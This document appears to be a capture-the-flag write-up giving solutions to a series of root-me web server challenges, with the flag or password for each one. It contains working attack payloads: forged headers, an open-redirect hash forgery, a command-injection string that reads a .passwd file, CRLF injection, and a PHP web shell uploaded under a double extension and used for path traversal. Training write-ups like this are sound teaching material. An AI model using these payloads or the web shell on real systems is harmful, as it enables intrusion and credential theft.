## Web Server root-me

### HTML - Source code

F12:

```
Je crois que c'est vraiment trop simple là !
It's really too easy !
password : nZ^&@q5&sjJHev0
```

### HTTP - IP restriction bypass

Add Header `X-Forwarded-For: 127.0.0.1`, `X-Forwarded-For: 192.168.1.1`, ...

```
Well done, the validation password is: Ip_$po0Fing
```

### HTTP - Open redirect

Open Facebook: http://challenge01.root-me.org/web-serveur/ch52/?url=https://facebook.com&h=a023cfbf5f1c39bdf8407f28b60cd134

Open Twitter: http://challenge01.root-me.org/web-serveur/ch52/?url=https://twitter.com&h=be8b09f7f1f66235a9c91986952483f0

Decode md5: a023cfbf5f1c39bdf8407f28b60cd134 -> https://facebook.com, be8b09f7f1f66235a9c91986952483f0 -> https://twitter.com

-> Redirect to: http://challenge01.root-me.org/web-serveur/ch52/?url=https://www.youtube.com&h=d245406cb6c9f36be9064c92c34e12e1

```
Well done, the flag is e6f8a530811d5a479812d7b82fc1a5c5
```

### HTTP - User-agent

Change Header `User-Agent: admin`

```
Welcome master!<br/>Password: rr$Li9%L34qd1AAe27
```

### Weak password

Payload username=admin&password=admin  -> password is `admin`

### PHP - Command injection

Payload `127.0.0.1;cat .passwd` -> S3rv1ceP1n9Sup3rS3cure

### Backup file

`curl http://challenge01.root-me.org/web-serveur/ch11/index.php~`

```
$username="ch11";
$password="OCCY9AcNm1tj";
...
```

### HTTP - Directory indexing

F12 -> we can see: `<!-- include("admin/pass.html") -->` in source code.

Access admin/pass.html -> back to admin -> access backup/admin.txt -> Password / Mot de passe : LINUX

### HTTP - Headers

We can see in Response Header `Header-RootMe-Admin: none` -> Change to `Header-RootMe-Admin: true`.

```
You dit it ! You can validate the challenge with the password HeadersMayBeUseful
```

### HTTP - POST

POST -> Change score in Request Body to 1000000 -> Re-POST

```
Flag to validate the challenge: H7tp_h4s_N0_s3Cr37S_F0r_y0U 
```

### HTTP - Improper redirect

The application redirect from index.php to login.php if you don't login.

Let's try: `curl challenge01.root-me.org/web-serveur/ch32/index.php`

```
The flag is : ExecutionAfterRedirectIsBad
```

### HTTP - Verb tampering

Try change method:

`curl -X POST challenge01.root-me.org/web-serveur/ch8/`

`curl -X PUT challenge01.root-me.org/web-serveur/ch8/`

```
<h1>Mot de passe / password : a23e$dme96d3saez$$prap
```

### Install files

F12 -> we can see `<!--  /web-serveur/ch6/phpbb -->` in source code.

Try access `http://challenge01.root-me.org/web-serveur/ch6/phpbb/install/install.php`:

```
Le mot de passe pour valider est : karambar
```

### CRLF

We can use the payload: `?username=admin authenticated.%0D%0Afoo&password=authenticated`

And get the response:

```
admin authenticated.
foo failed to authenticate.

Well done, you can validate challenge with this password : rFSP&G0p&5uAg1% 
```

### File upload - Double extensions

Create file `a.php.png` with following content and upload:

```php
<?php
$data = system($_GET["cmd"]);
echo $data;
?> 
```

Access to the file uploaded and add params on url `?cmd=ls`

```
a.php.png test.php.jpg test.php.png test.php.png 
```

Now we can use path traversal, let's try: `?cmd=ls ../../../ -a`

```
. .. ._init ._nginx.http-level.inc ._nginx.server-level.inc ._perms ._php-fpm.pool.inc .git .gitignore .passwd galerie index.php tmp tmp 
```

Finally, get password: `?cmd=cat ../../../.passwd`

```
Gg9LRz-hWSxqqUKd77-_q-6G8
```

### 

